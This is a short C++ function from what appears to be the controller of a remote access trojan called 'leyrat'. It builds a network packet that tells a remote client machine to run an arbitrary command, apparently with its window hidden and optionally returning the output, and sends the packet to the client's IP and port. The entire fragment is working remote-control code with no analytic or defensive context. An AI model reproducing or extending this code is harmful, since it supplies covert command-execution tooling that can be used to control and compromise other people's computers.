void leyrat::Request_RunCmd(const char *ip, const char*torun, bool getresponse)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting RunCmd :: %s!\n", ip, port, torun);

	char bpkg[1024];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('b');
	buf.WriteChar(0);//show

    if(getresponse)
    {
        buf.WriteChar(1);
    }else{
        buf.WriteChar(0);
    }

	buf.WriteString(torun);

	net.SendTo(ip, port, bpkg, buf.GetPos());

}